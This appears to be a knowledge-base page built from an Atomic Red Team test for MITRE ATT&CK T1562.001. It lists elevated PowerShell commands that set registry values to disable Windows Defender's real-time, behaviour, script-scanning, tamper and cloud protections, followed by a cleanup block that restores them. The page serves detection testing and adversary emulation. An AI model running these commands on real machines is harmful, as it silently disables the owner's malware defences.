---
atomic_guid: "a72cfef8-d252-48b3-b292-635d332625c3"
title: "Tamper with Windows Defender Registry - Powershell"
framework: "atomic"
generated: "true"
attack_technique_id: "T1562.001"
attack_technique_name: "Impair Defenses: Disable or Modify Tools"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "a72cfef8-d252-48b3-b292-635d332625c3"
  - "Tamper with Windows Defender Registry - Powershell"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Tamper with Windows Defender Registry - Powershell

Disable Windows Defender by tampering with windows defender registry through powershell

## Metadata

- Atomic GUID: a72cfef8-d252-48b3-b292-635d332625c3
- Technique: T1562.001: Impair Defenses: Disable or Modify Tools
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1562.001/T1562.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1562-impair_defenses|T1562.001]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender" -Name "DisableAntiVirus" -Value 1 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableIntrusionPreventionSystem" -Value 1 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableIOAVProtection" -Value 1 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRoutinelyTakingAction" -Value 1 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScriptScanning" -Value 1 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Reporting" -Name "DisableEnhancedNotifications" -Value 1  
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet" -Name "DisableBlockAtFirstSeen" -Value 1 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet" -Name "SpynetReporting" -Value 0 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\MpEngine" -Name "MpEnablePus" -Value 0 
Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection" -Name "DisallowExploitProtectionOverride" -Value 0 
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection"  -Value 0 
Set-ItemProperty "HKLM:\software\microsoft\windows defender\spynet" -Name "SubmitSamplesConsent" -Value 0 
Set-ItemProperty "HKLM:\Software\Microsoft\Windows Defender" -Name "PUAProtection" -Value 0
```

### Cleanup

```powershell
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 0 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender" -Name "DisableAntiVirus" -Value 0
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 0 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableIntrusionPreventionSystem" -Value 0
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableIOAVProtection" -Value 0 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 0 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 0 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRoutinelyTakingAction" -Value 0 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 0 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScriptScanning" -Value 0 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Reporting" -Name "DisableEnhancedNotifications" -Value 0  
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet" -Name "DisableBlockAtFirstSeen" -Value 0
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet" -Name "SpynetReporting" -Value 1 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\MpEngine" -Name "MpEnablePus" -Value 1 
Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection" -Name "DisallowExploitProtectionOverride" -Value 1 
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection"  -Value 1
Set-ItemProperty "HKLM:\software\microsoft\windows defender\spynet" -Name "SubmitSamplesConsent" -Value 1 
Set-ItemProperty "HKLM:\Software\Microsoft\Windows Defender" -Name "PUAProtection" -Value 1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml)
